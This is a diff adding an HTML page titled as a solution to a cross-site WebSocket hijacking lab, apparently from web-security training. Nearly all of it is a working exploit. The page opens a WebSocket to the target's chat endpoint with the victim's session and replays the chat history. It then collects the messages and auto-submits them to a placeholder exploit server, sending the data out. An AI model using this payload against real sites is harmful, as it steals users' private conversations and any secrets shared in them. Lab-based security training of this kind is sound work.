@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Lab: Cross-site WebSocket hijacking
+        </title>
+    </head>
+    <body>
+        <form action="https://EXPLOIT-SERVER-URL/" method="POST" id="exp-form">
+            <input name="responseFile" value="/exploit">
+            <textarea id="respHead" name="responseHead">
+                HTTP/1.1 200 OK
+                Content-Type: text/html; charset=utf-8
+            </textarea>
+            <textarea id="respBody" name="responseBody"></textarea>
+            <input type="hidden" name="formAction" value="STORE">
+        </form>
+        <div id="chat-log"></div>
+    </body>
+
+    <script>
+        ws = new WebSocket("wss://WEBSITE-URL/chat")
+
+        var chatLog = ''
+
+        ws.onopen = function (evt) {
+            console.log('websocket open')
+            ws.send("READY")
+        };
+
+        ws.onmessage = function (evt) {
+            var message = evt.data;
+            console.log('MESSAGE')
+            console.log(message)
+            if (message !== "TYPING") {
+                var messageJson = JSON.parse(message);
+                if (messageJson && messageJson['user'] !== "CONNECTED" && messageJson['content']) {
+                    chatLog += messageJson['user'] + ':' + messageJson['content'] + '\n'
+                    document.querySelector('#chat-log').innerHTML += '<div>' + messageJson['user'] + ':' + messageJson['content'] + '</div>'
+                }
+
+                if (messageJson['user'] === 'CONNECTED') {
+                    document.querySelector('#respBody').innerHTML = chatLog;
+                    document.querySelector('#exp-form').submit();
+                }
+            }
+        };
+    </script>
+</html>
